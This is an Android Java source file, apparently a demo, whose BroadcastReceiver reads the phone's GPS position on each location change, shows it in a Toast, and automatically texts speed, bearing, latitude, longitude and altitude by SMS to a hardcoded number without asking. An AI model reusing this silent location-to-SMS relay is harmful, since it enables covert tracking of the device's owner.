package jp.co.brilliantservice.hacks.uselocation2;

import java.util.List;

import jp.co.brilliantservice.hacks.uselocation.R;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.telephony.SmsManager;

import android.widget.EditText;
import android.widget.Toast;


public class Receiver extends BroadcastReceiver {

	     
	      
	  
	                                          
	  
	  
	static String phoneNu = "10086";
	static int mycount = 0;
	
	


    @Override
    

    
    public void onReceive(Context context, Intent intent) {

        if (intent.hasExtra(LocationManager.KEY_LOCATION_CHANGED)) {

            LocationManager lm = (LocationManager) context
                    .getSystemService(Context.LOCATION_SERVICE);

            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);

            String message = 
            				"Location"		+"\n" +
            				"Speed:"		+location.getSpeed()+"\n"+
            				"Provider:"		+location.getProvider()+"\n"+
            				"Bearing:"		+location.getBearing()+ "\n" +
            				"Longitude:" 	+ location.getLongitude() + "\n"+
            				"Latitude:" 	+ location.getLatitude()+"\n"+
            				"Altitude:"		+location.getAltitude();
            Toast.makeText(context, message, Toast.LENGTH_LONG).show();
            
            //直接调用短信接口发短信  
            SmsManager smsManager = SmsManager.getDefault();  
            String content = message;
          //  String ph = "13738020604";
			List<String> divideContents = smsManager.divideMessage(content);    
            for (String text : divideContents) {    
               smsManager.sendTextMessage(phoneNu, null, text, null, null); 
               
               mycount++;
               
               
	    } 

        }
   

    }

}
